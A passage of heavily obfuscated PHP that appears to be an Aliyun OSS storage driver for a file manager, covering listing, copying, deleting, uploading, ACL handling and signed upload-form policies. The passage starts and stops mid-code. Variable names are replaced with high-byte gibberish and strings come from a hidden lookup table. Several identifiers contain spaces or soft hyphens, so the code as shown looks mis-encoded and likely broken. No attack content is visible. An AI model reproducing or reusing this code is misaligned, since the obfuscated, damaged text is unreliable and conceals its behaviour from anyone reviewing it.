$üöÇú›à = $ë“ØÁœ»[0]->getAllowedOrigins(); $è‹Óäæ = $ë“ØÁœ»[0]->getAllowedMethods(); $Ÿ¥¨ëêí = $ë“ØÁœ»[0]->getMaxAgeSeconds(); $ÆË¹°Ò = $ë“ØÁœ»[0]->getExposeHeaders(); $ÎôÛ€÷ = $ë“ØÁœ»[0]->getAllowedHeaders(); return array($şä·ù¥ü[220] => isset($üöÇú›à[0]) ? $üöÇú›à[0] : $şä·ù¥ü[12], $şä·ù¥ü[224] => $è‹Óäæ, $şä·ù¥ü[1470] => $Ÿ¥¨ëêí, $şä·ù¥ü[1471] => isset($ÆË¹°Ò[0]) ? $ÆË¹°Ò[0] : $şä·ù¥ü[12], $şä·ù¥ü[221] => isset($ÎôÛ€÷[0]) ? $ÎôÛ€÷[0] : $şä·ù¥ü[12]); } public function isBucketCors() { $—ëå•â =& $_SERVER[°‰†òö¯]; $Ö©—Ş› = $this->getBucketCors(); if (!$Ö©—Ş› || !is_array($Ö©—Ş›)) { return !1; } if ($Ö©—Ş›[$—ëå•â[220]] != $—ëå•â[222] || $Ö©—Ş›[$—ëå•â[221]] != $—ëå•â[222]) { return !1; } $Úšà’†× = array_map($—ëå•â[223], $Ö©—Ş›[$—ëå•â[224]]); if (!is_array($Úšà’†×)) { $Úšà’†× = array(); } $åé¬Åó« = array($—ëå•â[225], $—ëå•â[226], $—ëå•â[227], $—ëå•â[228], $—ëå•â[229]); $Š®÷¿Ş = array_diff($åé¬Åó«, $Úšà’†×); return empty($Š®÷¿Ş); } public function mkfile($åê×›ü, $ˆç‚§˜ = '', $²—˜º¨Ó = REPEAT_RENAME) { $ÍôÇî£¸ = $this->setContent($åê×›ü, $ˆç‚§˜); if ($ÍôÇî£¸ !== !1) { return $this->getPathOuter($åê×›ü); } return !1; } public function mkdir($š ­Úİò, $¡ª´§Ö¢ = REPEAT_SKIP) { if ($¡ª´§Ö¢ && $this->_isFolder($š ­Úİò)) { return $this->getPathOuter($š ­Úİò); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($š ­Úİò)); } catch (OSS\Core\OssException $È‹½ÖÌÊ) { $this->writeLog(__FUNCTION__ . $_SERVER[°‰†òö¯][214] . $È‹½ÖÌÊ->getMessage()); return !1; } return $this->getPathOuter($š ­Úİò); } private function fileList($ÇşÓ»À„, $¾öÒ‘ê¢ = '', $ï÷ª«æú = 0) { $æİøş»¬ =& $_SERVER[°‰†òö¯]; $ÇşÓ»À„ = trim($ÇşÓ»À„, $æİøş»¬[8]); $Ú—Û‘’ = empty($ÇşÓ»À„) && $ÇşÓ»À„ !== $æİøş»¬[230] ? $æİøş»¬[12] : $ÇşÓ»À„ . $æİøş»¬[8]; $¹åğ®úà = $æİøş»¬[12]; $Ì™¥öÖ = 1000; $¯ı¿Ù = $Ù×²ôÜ™ = array(); while (!0) { check_abort(); $û½ùŒŞ = array($æİøş»¬[1472] => $¾öÒ‘ê¢, $æİøş»¬[1473] => $Ú—Û‘’, $æİøş»¬[1474] => $Ì™¥öÖ, $æİøş»¬[1475] => $¹åğ®úà); try { $İ¦åœÃ‘ = $this->client->listObjects($this->bucket, $û½ùŒŞ); } catch (OSS\Core\OssException $¾ß˜¹Æé) { $this->writeLog(__FUNCTION__ . $æİøş»¬[214] . $¾ß˜¹Æé->getMessage()); break; } $¹åğ®úà = $İ¦åœÃ‘->getNextMarker(); $ºĞÖĞÒÚ = $İ¦åœÃ‘->getObjectList(); $Ìî¥Á¼ñ = $İ¦åœÃ‘->getPrefixList(); foreach ($ºĞÖĞÒÚ as $ÖŠ€ì°¥) { if ($ÖŠ€ì°¥->getKey() == $Ú—Û‘’) { continue; } $¹Û‡°Ïí = $ÖŠ€ì°¥->getKey(); $üş™æÎÛ = $ÖŠ€ì°¥->getSize(); $ï©ã•“¨ = $ÖŠ€ì°¥->getLastModified(); $Şó»«©” = trim($ÖŠ€ì°¥->getETag(), $æİøş»¬[121]); $†ò´« = $ï÷ª«æú ? array($æİøş»¬[32] => $¹Û‡°Ïí, $æİøş»¬[79] => $üş™æÎÛ, $æİøş»¬[206] => strtotime($ï©ã•“¨), $æİøş»¬[1476] => $Şó»«©”) : $¹Û‡°Ïí; $àú¢äÆñ = $üş™æÎÛ == 0 && substr($¹Û‡°Ïí, strlen($¹Û‡°Ïí) - 1, 1) == $æİøş»¬[8] ? !0 : !1; $Í©´¦¨ù = array($æİøş»¬[79] => $üş™æÎÛ, $æİøş»¬[1477] => $üş™æÎÛ, $æİøş»¬[88] => strtotime($ï©ã•“¨), $æİøş»¬[1478] => $ï©ã•“¨, $æİøş»¬[1476] => $Şó»«©”); $this->cacheMethodInfoSet($¹Û‡°Ïí, $àú¢äÆñ, $Í©´¦¨ù); if ($àú¢äÆñ) { $¯ı¿Ù[] = $¹Û‡°Ïí; continue; } $Ù×²ôÜ™[] = $†ò´«; } foreach ($Ìî¥Á¼ñ as $°Ò§Ó¯´) { $¯ı¿Ù[] = $°Ò§Ó¯´->getPrefix(); $this->cacheMethodInfoSet($°Ò§Ó¯´->getPrefix(), !0); } if ($¹åğ®úà === $æİøş»¬[12]) { break; } } $this->cacheMethodInfoSet($ÇşÓ»À„, !0); return array($æİøş»¬[85] => $¯ı¿Ù, $æİøş»¬[86] => $Ù×²ôÜ™); } public function listObject($€çˆ©Ÿ‰, $˜ø•¦ÁÉ = '') { $¸¨úëœë =& $_SERVER[°‰†òö¯]; $€çˆ©Ÿ‰ = trim($€çˆ©Ÿ‰, $¸¨úëœë[8]); $ËÁÀæİª = empty($€çˆ©Ÿ‰) && $€çˆ©Ÿ‰ !== $¸¨úëœë[230] ? $¸¨úëœë[12] : $€çˆ©Ÿ‰ . $¸¨úëœë[8]; $«¨±†Êù = $¸¨úëœë[12]; $Ïäüœ = 1000; $‰Î§Õ° = $Ó•¢Ê¶ = array(); while (!0) { check_abort(); $íáºéÇ£ = array($¸¨úëœë[1472] => $˜ø•¦ÁÉ, $¸¨úëœë[1473] => $ËÁÀæİª, $¸¨úëœë[1474] => $Ïäüœ, $¸¨úëœë[1475] => $«¨±†Êù); try { $Á¡Ò©È© = $this->client->listObjects($this->bucket, $íáºéÇ£); } catch (OSS\Core\OssException $î¸àƒ») { $this->writeLog(__FUNCTION__ . $¸¨úëœë[214] . $î¸àƒ»->getMessage()); break; } $«¨±†Êù = $Á¡Ò©È©->getNextMarker(); $·ÔÃÁ‰ = $Á¡Ò©È©->getObjectList(); foreach ($·ÔÃÁ‰ as $‡†ë¿) { if ($‡†ë¿->getKey() == $ËÁÀæİª) { continue; } $º­úàŠ¿ = $‡†ë¿->getKey(); $«ùí¯Ëó = $‡†ë¿->getSize(); $»Ãã•Ú› = $«ùí¯Ëó == 0 && substr($º­úàŠ¿, strlen($º­úàŠ¿) - 1, 1) == $¸¨úëœë[8] ? !0 : !1; if ($»Ãã•Ú›) { continue; } $Ó•¢Ê¶[] = $«ùí¯Ëó . $¸¨úëœë[214] . $º­úàŠ¿; } if ($«¨±†Êù === $¸¨úëœë[12]) { break; } } return array($¸¨úëœë[85] => $‰Î§Õ°, $¸¨úëœë[86] => $Ó•¢Ê¶); } public function copyFile($ÛÌß±Œ¿, $ˆÒš¼) { $Ôóƒ‡Õ• = $this->size($ÛÌß±Œ¿); if ($Ôóƒ‡Õ• < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $ÛÌß±Œ¿, $this->bucket, $this->pathEncode($ˆÒš¼)); } catch (OSS\Core\OssException $©ùş·†²) { $this->writeLog(__FUNCTION__ . $_SERVER[°‰†òö¯][214] . $©ùş·†²->getMessage()); return !1; } return $this->getPathOuter($ˆÒš¼); } $¶Íğ¤Ú = $this->multiCopyObject($ÛÌß±Œ¿, $ˆÒš¼, $Ôóƒ‡Õ•); return $¶Íğ¤Ú ? $this->getPathOuter($ˆÒš¼) : !1; } private function multiCopyObject($ë‰‘Äí, $„Ã›¼›, $¾ˆ¢«İ) { $¾¬ñüÜ =& $_SERVER[°‰†òö¯]; try { $Õ·ùûà  = array(); if ($Òç˜†Æ = $this->hashMd5($ë‰‘Äí)) { $Õ·ùûà  = array(OSS\OssClient::OSS_HEADERS => array($¾¬ñüÜ[1479] => $Òç˜†Æ)); } $ËõÄÙ²Ò = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($„Ã›¼›), $Õ·ùûà ); $Óç´ÏÊî = 1; $·ŞÈÕ×¥ = 0; $ˆ½Ö±›¿ = array(); $»ÇÌ® Ù = 1024 * 1024 * 10; $çúŒÇÜú = $this->client->generateMultiuploadParts($¾ˆ¢«İ, $»ÇÌ® Ù); foreach ($çúŒÇÜú as $íå÷ÈÒ¤ => $ø€“²àÎ) { $¸…¹×Œ¹ = $·ŞÈÕ×¥ + (int) $ø€“²àÎ[$¾¬ñüÜ[1480]]; $ØòŞ¨ûû = (int) $ø€“²àÎ[$¾¬ñüÜ[414]] + $¸…¹×Œ¹ - 1; $ß…Òº–à = array($¾¬ñüÜ[167] => $¸…¹×Œ¹, $¾¬ñüÜ[168] => $ØòŞ¨ûû); $ˆ½Ö±›¿[] = $this->client->uploadPartCopy($this->bucket, $ë‰‘Äí, $this->bucket, $this->pathEncode($„Ã›¼›), $Óç´ÏÊî, $ËõÄÙ²Ò, $ß…Òº–à); $Óç´ÏÊî = $Óç´ÏÊî + 1; } $•·ÜîÏ = array(); foreach ($ˆ½Ö±›¿ as $íå÷ÈÒ¤ => $‚™èÉô›) { $•·ÜîÏ[] = array($¾¬ñüÜ[299] => $íå÷ÈÒ¤ + 1, $¾¬ñüÜ[300] => $‚™èÉô›); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($„Ã›¼›), $ËõÄÙ²Ò, $•·ÜîÏ); } catch (OSS\Core\OssException $ã™ÈÂÖ†) { $this->writeLog(__FUNCTION__ . $¾¬ñüÜ[214] . $ã™ÈÂÖ†->getMessage()); return !1; } return !0; } public function moveFile($ÌÀÈâ¹ë, $º¼ÀëÙú) { if ($this->copyFile($ÌÀÈâ¹ë, $º¼ÀëÙú)) { $this->remove($ÌÀÈâ¹ë); return $this->getPathOuter($º¼ÀëÙú); } return !1; } public function delFile($šœùş‚€) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($šœùş‚€)); } catch (OSS\Core\OssException $³îóœ¡ã) { $this->writeLog(__FUNCTION__ . $_SERVER[°‰†òö¯][214] . $³îóœ¡ã->getMessage()); return !1; } return !0; } public function delFolder($ıšè¼·) { $Ä•»Æµê =& $_SERVER[°‰†òö¯]; if (!$this->exist($ıšè¼·)) { return !0; } $this->listItemCache = !1; $ğÙÓ€«ğ = $this->fileList($ıšè¼·); $this->listItemCache = !0; $«‘…Öû = trim($ıšè¼·, $Ä•»Æµê[8]) . $Ä•»Æµê[8]; if (!empty($ıšè¼·) && $ıšè¼· !== $Ä•»Æµê[230] && !in_array($«‘…Öû, $ğÙÓ€«ğ[$Ä•»Æµê[85]])) { $ğÙÓ€«ğ[$Ä•»Æµê[85]][] = $«‘…Öû; } $Âë¾†Ê = $this->delByBatch($ğÙÓ€«ğ[$Ä•»Æµê[86]]); if (!$Âë¾†Ê) { return !1; } $Âë¾†Ê = $this->delByBatch($ğÙÓ€«ğ[$Ä•»Æµê[85]]); if (!$Âë¾†Ê) { return !1; } return $this->delFile($«‘…Öû); } private function delByBatch($®»¾Åµ) { foreach (array_chunk($®»¾Åµ, 1000) as $ŠÀê‘¹’) { try { $this->client->deleteObjects($this->bucket, $ŠÀê‘¹’); } catch (OSS\Core\OssException $ ¤îÍü) { $this->writeLog(__FUNCTION__ . $_SERVER[°‰†òö¯][214] . $ ¤îÍü->getMessage()); return !1; } } return !0; } public function rename($£¹ª¼, $äª §øÎ) { return $this->renameObject($£¹ª¼, $äª §øÎ); } private function fileInfo($ĞĞ°Ç…, $Ó‚Óìï² = false, $¾­ª£Ñ® = array()) { $îßİ´­ =& $_SERVER[°‰†òö¯]; $ÎÈ…  = array($îßİ´­[32] => $this->pathThis($ĞĞ°Ç…), $îßİ´­[87] => $this->getPathOuter($ĞĞ°Ç…), $îßİ´­[33] => $îßİ´­[232], $îßİ´­[79] => isset($¾­ª£Ñ®[$îßİ´­[79]]) ? $¾­ª£Ñ®[$îßİ´­[79]] : 0, $îßİ´­[169] => $this->ext($ĞĞ°Ç…)); if ($Ó‚Óìï²) { return $ÎÈ… ; } $ÎÈ… [$îßİ´­[233]] = $ÎÈ… [$îßİ´­[88]] = 0; $ÎÈ… [$îßİ´­[234]] = $ÎÈ… [$îßİ´­[235]] = !0; if (empty($¾­ª£Ñ®)) { $ÂäáŞ÷Á = $this->objectMeta($ĞĞ°Ç…); if (!$ÂäáŞ÷Á) { return $ÎÈ… ; } $¾­ª£Ñ® = array($îßİ´­[88] => strtotime($ÂäáŞ÷Á[$îßİ´­[1478]]), $îßİ´­[79] => $ÂäáŞ÷Á[$îßİ´­[1477]] + 0, $îßİ´­[1476] => $ÂäáŞ÷Á[$îßİ´­[1476]]); } if (isset($¾­ª£Ñ®[$îßİ´­[1476]]) && $¾­ª£Ñ®[$îßİ´­[1476]]) { $ÎÈ… [$îßİ´­[237]] = trim($¾­ª£Ñ®[$îßİ´­[1476]], $îßİ´­[121]); } if (isset($¾­ª£Ñ®[$îßİ´­[79]])) { $ÎÈ… [$îßİ´­[79]] = $¾­ª£Ñ®[$îßİ´­[79]]; } if (isset($¾­ª£Ñ®[$îßİ´­[88]])) { $ÎÈ… [$îßİ´­[88]] = $¾­ª£Ñ®[$îßİ´­[88]]; } if (isset($¾­ª£Ñ®[$îßİ´­[206]]) && !trim($ÎÈ… [$îßİ´­[88]])) { $ÎÈ… [$îßİ´­[88]] = $¾­ª£Ñ®[$îßİ´­[206]]; } return $ÎÈ… ; } private function folderInfo($ú›éÊ á, $±ÃºÉô… = false, $«î›÷ÇÆ = array()) { $ìê­Ã˜ş =& $_SERVER[°‰†òö¯]; $µ”ü‹Ü = array($ìê­Ã˜ş[32] => $this->pathThis($ú›éÊ á), $ìê­Ã˜ş[87] => $this->getPathOuter($ìê­Ã˜ş[8] . $ú›éÊ á), $ìê­Ã˜ş[33] => $ìê­Ã˜ş[78]); if ($±ÃºÉô…) { return $µ”ü‹Ü; } $µ”ü‹Ü[$ìê­Ã˜ş[233]] = $µ”ü‹Ü[$ìê­Ã˜ş[88]] = 0; $µ”ü‹Ü[$ìê­Ã˜ş[234]] = $µ”ü‹Ü[$ìê­Ã˜ş[235]] = !0; if (empty($«î›÷ÇÆ)) { $ú›éÊ á = rtrim($ú›éÊ á, $ìê­Ã˜ş[8]) . $ìê­Ã˜ş[8]; $Ç¬İú“ = $this->objectMeta($ú›éÊ á); if (!$Ç¬İú“) { return $µ”ü‹Ü; } $«î›÷ÇÆ = array($ìê­Ã˜ş[233] => $Ç¬İú“[$ìê­Ã˜ş[579]][$ìê­Ã˜ş[1481]], $ìê­Ã˜ş[88] => strtotime($Ç¬İú“[$ìê­Ã˜ş[1478]])); } if (isset($«î›÷ÇÆ[$ìê­Ã˜ş[88]])) { $µ”ü‹Ü[$ìê­Ã˜ş[88]] = $«î›÷ÇÆ[$ìê­Ã˜ş[88]]; } if (isset($«î›÷ÇÆ[$ìê­Ã˜ş[233]])) { $µ”ü‹Ü[$ìê­Ã˜ş[233]] = $«î›÷ÇÆ[$ìê­Ã˜ş[233]]; } return $µ”ü‹Ü; } public function listPath($á‰ıŠ®æ, $‰ªÚ—ãœ = false) { $…ğÏ™»­ =& $_SERVER[°‰†òö¯]; $ğşÂøçç = $this->fileList($á‰ıŠ®æ, $…ğÏ™»­[8], !0); foreach ($ğşÂøçç[$…ğÏ™»­[85]] as $Ñ¾Å»Ôè => $ì‘ê‡¿ ) { $ğşÂøçç[$…ğÏ™»­[85]][$Ñ¾Å»Ôè] = $this->folderInfo($ì‘ê‡¿ , $‰ªÚ—ãœ, $ì‘ê‡¿ ); } foreach ($ğşÂøçç[$…ğÏ™»­[86]] as $Ñ¾Å»Ôè => $ì‘ê‡¿ ) { $ğşÂøçç[$…ğÏ™»­[86]][$Ñ¾Å»Ôè] = $this->fileInfo($ì‘ê‡¿ [$…ğÏ™»­[32]], $‰ªÚ—ãœ, $ì‘ê‡¿ ); } return $ğşÂøçç; } protected function infoChildren($ŸíĞäğ¨, &$æİ™÷÷) { $û•öŠä¦ =& $_SERVER[°‰†òö¯]; $ü÷ò½˜ = $this->fileList($ŸíĞäğ¨, $û•öŠä¦[12], !0); $æİ™÷÷[$û•öŠä¦[81]] += count($ü÷ò½˜[$û•öŠä¦[85]]); $æİ™÷÷[$û•öŠä¦[80]] += count($ü÷ò½˜[$û•öŠä¦[86]]); foreach ($ü÷ò½˜[$û•öŠä¦[86]] as $…Äğ‹·) { if (!$…Äğ‹· || !$…Äğ‹·[$û•öŠä¦[79]]) { continue; } $æİ™÷÷[$û•öŠä¦[79]] += $…Äğ‹·[$û•öŠä¦[79]]; } } public function has($æÍœÀÍ‘, $¯Ü´ª† = false, $‡°¤‚ = true) { $®ìÛ˜‹± =& $_SERVER[°‰†òö¯]; $æÍœÀÍ‘ = trim($æÍœÀÍ‘, $®ìÛ˜‹±[8]); $½ŸïëÜŒ = empty($æÍœÀÍ‘) && $æÍœÀÍ‘ !== $®ìÛ˜‹±[230] ? $®ìÛ˜‹±[12] : $æÍœÀÍ‘ . $®ìÛ˜‹±[8]; $óÇñÎ±¼ = $®ìÛ˜‹±[12]; $ŠµĞšøğ = 500; $¶ÅŞÛ•è = $¸ìş¤ß = 0; while (!0) { check_abort(); $ÕŞó¢”Û = array($®ìÛ˜‹±[1472] => $®ìÛ˜‹±[8], $®ìÛ˜‹±[1473] => $½ŸïëÜŒ, $®ìÛ˜‹±[1474] => $ŠµĞšøğ, $®ìÛ˜‹±[1475] => $óÇñÎ±¼); try { $ÄÉÔœ÷† = $this->client->listObjects($this->bucket, $ÕŞó¢”Û); } catch (OSS\Core\OssException $¡ÉÂÓÁË) { $this->writeLog(__FUNCTION__ . $®ìÛ˜‹±[214] . $¡ÉÂÓÁË->getMessage()); break; } $óÇñÎ±¼ = $ÄÉÔœ÷†->getNextMarker(); $¤­šÂñ€ = $ÄÉÔœ÷†->getObjectList(); $°Úß¤ Û = $ÄÉÔœ÷†->getPrefixList(); if ($¯Ü´ª†) { if (count($¤­šÂñ€) > 1 || count($¤­šÂñ€) == 1 && $¤­šÂñ€[0]->getKey() != $½ŸïëÜŒ) { $¶ÅŞÛ•è += count($¤­šÂñ€) - 1; } if (!empty($°Úß¤ Û)) { $¸ìş¤ß += count($°Úß¤ Û); } if ($óÇñÎ±¼ === $®ìÛ˜‹±[12]) { break; } continue; } if ($‡°¤‚) { if (!empty($¤­šÂñ€)) { if (count($¤­šÂñ€) > 1 || $¤­šÂñ€[0]->getKey() != $½ŸïëÜŒ) { return !0; } } } else { if (!empty($°Úß¤ Û)) { return !0; } } if ($óÇñÎ±¼ === $®ìÛ˜‹±[12]) { break; } } if ($¯Ü´ª†) { return array($®ìÛ˜‹±[241] => $¶ÅŞÛ•è, $®ìÛ˜‹±[242] => $¸ìş¤ß); } return !1; } public function listAll($ò…š›‹–) { $Öã˜ËğÙ =& $_SERVER[°‰†òö¯]; $äç½ßøÈ = $this->fileList($ò…š›‹–, $Öã˜ËğÙ[12], !0); $§¢¥Ç©Í = array_to_keyvalue($äç½ßøÈ[$Öã˜ËğÙ[86]], $Öã˜ËğÙ[32]); foreach ($äç½ßøÈ[$Öã˜ËğÙ[85]] as $ÃØ¶İÒÖ) { if (is_string($ÃØ¶İÒÖ)) { $§¢¥Ç©Í[$ÃØ¶İÒÖ] = array($Öã˜ËğÙ[79] => 0); } } return $this->listAllFiles($ò…š›‹–, $§¢¥Ç©Í); } public function canRead($ôÎ¸Æ¼Ó) { $•ÖÀ¬–Î =& $_SERVER[°‰†òö¯]; $Ë÷ÑÊÁ¢ = $this->pathAcl($ôÎ¸Æ¼Ó); return $Ë÷ÑÊÁ¢ == $•ÖÀ¬–Î[1482] || $Ë÷ÑÊÁ¢ == $•ÖÀ¬–Î[626] ? !0 : !1; } public function canWrite($ĞªÜÃ…•) { $èûÆ±¬Å = $this->pathAcl($ĞªÜÃ…•); return $èûÆ±¬Å == $_SERVER[°‰†òö¯][626] ? !0 : !1; } public function pathAcl($Ëê¸Ó) { $üôÈùŞÓ =& $_SERVER[°‰†òö¯]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $«üÔÆ€¥ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($Ëê¸Ó)); } catch (OSS\Core\OssException $ô¾§ÙûÀ) { $this->writeLog(__FUNCTION__ . $üôÈùŞÓ[214] . $ô¾§ÙûÀ->getMessage()); return !1; } $Ò¥¦Â˜– = $«üÔÆ€¥ == $üôÈùŞÓ[37] ? $this->bucketAcl : $«üÔÆ€¥; if ($Ò¥¦Â˜– == $üôÈùŞÓ[1483]) { return $üôÈùŞÓ[1482]; } if ($Ò¥¦Â˜– == $üôÈùŞÓ[1484]) { return $üôÈùŞÓ[626]; } return $Ò¥¦Â˜–; } private function chmodPath($“£ƒ•²Ï, $µâÈãû“ = '') { $ÀÜ´¹ª© =& $_SERVER[°‰†òö¯]; $†€ĞÇğÎ = empty($µâÈãû“) ? $ÀÜ´¹ª©[1484] : $µâÈãû“; $Ñ¥¥ïÖ = array($ÀÜ´¹ª©[37], $ÀÜ´¹ª©[231], $ÀÜ´¹ª©[1483], $ÀÜ´¹ª©[1484]); if (!in_array($†€ĞÇğÎ, $Ñ¥¥ïÖ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($“£ƒ•²Ï), $†€ĞÇğÎ); } catch (OSS\Core\OssException $‘Î„ñôÀ) { $this->writeLog(__FUNCTION__ . $ÀÜ´¹ª©[214] . $‘Î„ñôÀ->getMessage()); return !1; } return !0; } public function getContent($ÍüéŒéº) { return $this->fileSubstr($ÍüéŒéº, -1); } public function setContent($‰şŒäĞ, $Áó‘¤¦ = '') { $ãØåò÷ =& $_SERVER[°‰†òö¯]; try { $«ğâ–É‘ = $this->trafficLimit($ãØåò÷[1485]); $£¹òù½ = $this->client->putObject($this->bucket, $this->pathEncode($‰şŒäĞ), $Áó‘¤¦, $«ğâ–É‘); } catch (OSS\Core\OssException $ÖÚ ª¯) { $this->writeLog(__FUNCTION__ . $ãØåò÷[214] . $ÖÚ ª¯->getMessage()); return !1; } $œìæößç = array($ãØåò÷[1479] => trim($£¹òù½[$ãØåò÷[1476]], $ãØåò÷[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($‰şŒäĞ))); $this->updateObjMeta($‰şŒäĞ, $œìæößç); return isset($£¹òù½[$ãØåò÷[1486]][$ãØåò÷[296]]) ? !0 : !1; } private function updateObjMeta($Œµ™šæé, $şè‡ûÕ‡) { $Œµ™šæé = $this->pathEncode($Œµ™šæé); try { $Êş“¤¬Ö = array(OSS\OssClient::OSS_HEADERS => $şè‡ûÕ‡); $this->client->copyObject($this->bucket, $Œµ™šæé, $this->bucket, $Œµ™šæé, $Êş“¤¬Ö); } catch (OSS\Core\OssException $Ù¦§¤ô) { $this->writeLog(__FUNCTION__ . $_SERVER[°‰†òö¯][214] . $Ù¦§¤ô->getMessage()); return !1; } return !0; } public function upload($ö¯Ì‚´Ş, $°¿Şœ’è, $ÛîÜ”¤ = false, $¹Å˜ë¡ = REPEAT_REPLACE) { $¸ÖêƒØ‘ =& $_SERVER[°‰†òö¯]; $“ïõ = trim($ö¯Ì‚´Ş, $¸ÖêƒØ‘[8]); $­ø ±ƒ½ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($¸ÖêƒØ‘[1479] => @md5_file($°¿Şœ’è)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ö¯Ì‚´Ş))); $­ø ±ƒ½ = $this->trafficLimit($¸ÖêƒØ‘[1485], $­ø ±ƒ½); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($“ïõ), $°¿Şœ’è, $­ø ±ƒ½); } catch (OSS\Core\OssException $ıâÊö¼¹) { $this->writeLog(__FUNCTION__ . $¸ÖêƒØ‘[214] . $ıâÊö¼¹->getMessage()); return !1; } return $this->getPathOuter($ö¯Ì‚´Ş); } public function getHost() { $ì¾î€ =& $_SERVER[°‰†òö¯]; $¾œñÃÍë = explode($ì¾î€[210], parent::getHost()); return $¾œñÃÍë[0] . $ì¾î€[210] . $this->bucket . $ì¾î€[10] . $¾œñÃÍë[1]; } public function uploadFormData($ÁÊÛ“ó·, $ô˜ÕŸúÊ = 3600) { $Ú†Åá¿Æ =& $_SERVER[°‰†òö¯]; if (!($’éëš°ì = $this->getHost())) { return !1; } $æÄàÁ¸À = $ô˜ÕŸúÊ; $˜„õá…Ô = date($Ú†Åá¿Æ[1487], time() + $æÄàÁ¸À); $Ïúæä¸­ = new DateTime($˜„õá…Ô); $ËĞÔøÀ› = $Ïúæä¸­->format(DateTime::ISO8601); $ÛÙ…ä¡Ã = strpos($ËĞÔøÀ›, $Ú†Åá¿Æ[373]); $ËĞÔøÀ› = substr($ËĞÔøÀ›, 0, $ÛÙ…ä¡Ã) . $Ú†Åá¿Æ[1488]; $êÎÀˆÃè = 1048576000 * 5; $£èÜåË® = $this->pathFather($ÁÊÛ“ó·); $æô¸şµ¡ = array($Ú†Åá¿Æ[264] => $ËĞÔøÀ›, $Ú†Åá¿Æ[267] => array(array($Ú†Åá¿Æ[1489], 0, $êÎÀˆÃè), array($Ú†Åá¿Æ[269], $Ú†Åá¿Æ[270], $£èÜåË®))); $¨Ã™­ÂË = base64_encode(json_encode($æô¸şµ¡)); $®ùÔƒ‘ = base64_encode(hash_hmac($Ú†Åá¿Æ[1410], $¨Ã™­ÂË, $this->secret, !0)); $¬¥›Ñ° = array($Ú†Åá¿Æ[1490] => $this->accessKey, $Ú†Åá¿Æ[279] => $¨Ã™­ÂË, $Ú†Åá¿Æ[272] => $Ú†Åá¿Æ[263], $Ú†Åá¿Æ[1491] => $®ùÔƒ‘, $Ú†Åá¿Æ[208] => $’éëš°ì); $¬¥›Ñ° = $this->trafficLimit($Ú†Åá¿Æ[1485], $¬¥›Ñ°, !0); return $¬¥›Ñ°; } public function uploadMultiData($°Š·ıÃ, $¹”¬şÑ  = 3600) { $†—°öÅæ =& $_SERVER[°‰†òö¯]; if (!($­ñ«¡ = $this->getHost())) { return !1; } $ğêÛ±ø“ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($°Š·ıÃ)); return array($†—°öÅæ[283] => $ğêÛ±ø“, $†—°öÅæ[208] => $­ñ«¡ . $†—°öÅæ[8] . $this->pathEncode($°Š·ıÃ), $†—°öÅæ[284] => gmdate($†—°öÅæ[1492]), $†—°öÅæ[97] => $°Š·ıÃ); } public function uploadMultiAuth($ŒÕËœ‚¹, $—üëÏğ… = array()) { if (isset($—üëÏğ…[$_SERVER[°‰†òö¯][285]])) { return $this->uploadPartAuth($ŒÕËœ‚¹, $—üëÏğ…); } return $this->uploadListAuth($ŒÕËœ‚¹, $—üëÏğ…); } private function uploadPartAuth($¯•–¦úÍ, $†ÛÔ¤ = array()) { $ßÆ…”™† =& $_SERVER[°‰†òö¯]; $Àí¦äàŠ = $†ÛÔ¤[$ßÆ…”™†[97]]; $ø²Öá¼ú = $this->_getUploadAuth($Àí¦äàŠ, $†ÛÔ¤); $¦ö•´ã = array($ßÆ…”™†[288] => $ø²Öá¼ú[$ßÆ…”™†[288]], $ßÆ…”™†[284] => $ø²Öá¼ú[$ßÆ…”™†[284]]); if (isset($ø²Öá¼ú[$ßÆ…”™†[1493]])) { $¦ö•´ã[$ßÆ…”™†[1493]] = $ø²Öá¼ú[$ßÆ…”™†[1493]]; } return $¦ö•´ã; } private function uploadListAuth($ µ€›Ş¿, $§ÎÌıÔ = array()) { $¥£ÈĞè˜ =& $_SERVER[°‰†òö¯]; $ÂàÍŸî‡ = $§ÎÌıÔ[$¥£ÈĞè˜[97]]; $†‰Ì„éà = $§ÎÌıÔ[$¥£ÈĞè˜[283]]; $áÎ’—Ìù = $this->client->listParts($this->bucket, $this->pathEncode($ÂàÍŸî‡), $†‰Ì„éà); $Ò¶±°ÖÜ = $áÎ’—Ìù->getListPart(); $·±ì´Ÿ = array(); foreach ($Ò¶±°ÖÜ as $—ùÖ«ş“) { $·±ì´Ÿ[] = array($¥£ÈĞè˜[299] => $—ùÖ«ş“->getPartNumber(), $¥£ÈĞè˜[300] => trim($—ùÖ«ş“->getETag(), $¥£ÈĞè˜[121])); } if (!$·±ì´Ÿ) { return !1; } $Ûİô¥ü¤ = $this->_getUploadAuth($ÂàÍŸî‡, $§ÎÌıÔ); return array($¥£ÈĞè˜[288] => $Ûİô¥ü¤[$¥£ÈĞè˜[288]], $¥£ÈĞè˜[284] => $Ûİô¥ü¤[$¥£ÈĞè˜[284]], $¥£ÈĞè˜[291] => $·±ì´Ÿ); } private function _getUploadAuth($â˜¡–®, $¬Œ§¥‚¡) { $µÂûèÙ =& $_SERVER[°‰†òö¯]; $–ÂÍ¦É² = gmdate($µÂûèÙ[1492]); $šø™¯Ô = isset($¬Œ§¥‚¡[$µÂûèÙ[285]]) ? $µÂûèÙ[255] : $µÂûèÙ[290]; $áÒ•¹Ë = array_intersect_key($¬Œ§¥‚¡, array_flip(array($µÂûèÙ[285], $µÂûèÙ[283]))); ksort($áÒ•¹Ë); $½ÕÍóƒÓ = $áÒ•¹Ë ? $µÂûèÙ[76] . http_build_query($áÒ•¹Ë, null, $µÂûèÙ[286], PHP_QUERY_RFC3986) : $µÂûèÙ[12]; $Ï°ŞãÖó = array($šø™¯Ô, 